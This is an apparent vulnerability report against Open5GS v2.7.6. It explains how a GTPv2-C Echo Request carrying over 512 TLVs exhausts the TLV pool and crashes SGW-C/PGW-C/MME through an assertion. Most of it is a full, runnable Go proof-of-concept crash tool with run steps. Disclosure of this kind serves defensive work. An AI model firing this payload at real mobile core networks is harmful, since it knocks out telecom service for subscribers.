### Open5GS Release, Revision, or Tag

v2.7.6

### Description
SGW-C/PGW-C/MME can be forced to abort (core dump) by sending a single GTPv2-C message containing an excessive number of TLVs (IEs). This exhausts the internal TLV pool (commonly 512 entries), causing ogs_tlv_get() to fail and return NULL, the SGW-C asserts on Crash ogs_tlv_get.

### Steps to reproduce
1. Start a new go project inside a new folder: go mod init poc
2. Create a `main.go` and paste the code below: 
```
package main

import (
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"time"

	"github.com/wmnsk/go-gtp/gtpv2/ie"
	"github.com/wmnsk/go-gtp/gtpv2/message"
)

// PoC: exhaust Open5GS TLV pool by sending a GTPv2-C message with many TLVs.
// Use only in authorized lab environments.
func main() {
	target := flag.String("target", "", "SGW-C GTP-C IP (required)")
	port := flag.Int("port", 2123, "GTP-C port")
	laddr := flag.String("laddr", "", "Optional local IP to bind")
	count := flag.Uint("count", 1, "How many packets to send")
	interval := flag.Duration("interval", 0, "Delay between sends")
	tlvCount := flag.Int("tlv-count", 600, "Number of padding TLVs to append (pool is 512)")
	tlvLen := flag.Int("tlv-len", 0, "Padding TLV value length in bytes")
	tlvType := flag.Int("tlv-type", 0xff, "Padding TLV type (0-255)")
	tlvInst := flag.Int("tlv-inst", 0, "Padding TLV instance (0-15)")
	recovery := flag.Uint("recovery", 0, "Recovery IE value for EchoRequest")
	seq := flag.Uint("seq", 0, "Starting sequence number (0=random)")
	flag.Parse()

	if *target == "" {
		log.Fatal("Error: --target is required")
	}
	if *tlvCount < 0 || *tlvLen < 0 {
		log.Fatal("Error: --tlv-count and --tlv-len must be >= 0")
	}
	if *tlvType < 0 || *tlvType > 255 {
		log.Fatal("Error: --tlv-type must be in [0,255]")
	}
	if *tlvInst < 0 || *tlvInst > 15 {
		log.Fatal("Error: --tlv-inst must be in [0,15]")
	}

	rand.Seed(time.Now().UnixNano())

	rp, err := net.ResolveUDPAddr("udp", net.JoinHostPort(*target, fmt.Sprintf("%d", *port)))
	if err != nil {
		log.Fatalf("resolve raddr: %v", err)
	}

	var lp *net.UDPAddr
	if *laddr != "" {
		lp, err = net.ResolveUDPAddr("udp", net.JoinHostPort(*laddr, "0"))
		if err != nil {
			log.Fatalf("resolve laddr: %v", err)
		}
	}

	conn, err := net.DialUDP("udp", lp, rp)
	if err != nil {
		log.Fatalf("dial udp: %v", err)
	}
	defer conn.Close()

	payload, err := buildEchoWithTLVs(
		uint8(*recovery),
		*tlvCount,
		*tlvLen,
		uint8(*tlvType),
		uint8(*tlvInst),
	)
	if err != nil {
		log.Fatalf("build payload: %v", err)
	}

	seqNum := startSeq(uint32(*seq))
	log.Printf("[*] Sending EchoRequest with %d TLVs to %s (len=%d)", *tlvCount, rp, len(payload))
	for i := uint(0); i < *count; i++ {
		setSeq(payload, seqNum)
		if _, err := conn.Write(payload); err != nil {
			log.Printf("[!] send failed: %v", err)
		}
		seqNum = nextSeq(seqNum)
		if i+1 < *count && *interval > 0 {
			time.Sleep(*interval)
		}
	}
	log.Println("[*] Done. Monitor SGW-C for ogs_tlv_get assertion (lib/core/ogs-tlv.c:37).")
}

func buildEchoWithTLVs(recovery uint8, tlvCount, tlvLen int, tlvType, tlvInst uint8) ([]byte, error) {
	msg := message.NewEchoRequest(0, ie.NewRecovery(recovery))
	base, err := msg.Marshal()
	if err != nil {
		return nil, err
	}
	if tlvLen > 0xffff {
		return nil, fmt.Errorf("tlv-len too large: %d", tlvLen)
	}
	extra := tlvCount * (4 + tlvLen)
	total := len(base) + extra
	if total > 0xffff+4 {
		return nil, fmt.Errorf("payload too large: %d", total)
	}

	b := make([]byte, total)
	copy(b, base)
	off := len(base)
	for i := 0; i < tlvCount; i++ {
		b[off] = tlvType
		b[off+1] = byte(tlvLen >> 8)
		b[off+2] = byte(tlvLen)
		b[off+3] = tlvInst & 0x0f
		off += 4 + tlvLen
	}
	setLength(b)
	return b, nil
}

func setLength(b []byte) {
	if len(b) < 4 {
		return
	}
	l := len(b) - 4
	if l > 0xffff {
		return
	}
	b[2] = byte(l >> 8)
	b[3] = byte(l)
}

func setSeq(b []byte, seq uint32) {
	if len(b) < 8 {
		return
	}
	b[4] = byte(seq >> 16)
	b[5] = byte(seq >> 8)
	b[6] = byte(seq)
}

func startSeq(base uint32) uint32 {
	if base == 0 {
		base = (rand.Uint32() & 0x00ffffff) + 1
	}
	seq := base & 0x00ffffff
	if seq == 0 {
		seq = 1
	}
	return seq
}

func nextSeq(seq uint32) uint32 {
	seq = (seq + 1) & 0x00ffffff
	if seq == 0 {
		seq = 1
	}
	return seq
}
```
3. Download required libraries: `go mod tidy`
4. Run the program with the upf pfcp server address: `go run ./main.go --target 10.44.44.2 --count 1 --tlv-count 600 --tlv-len 0`


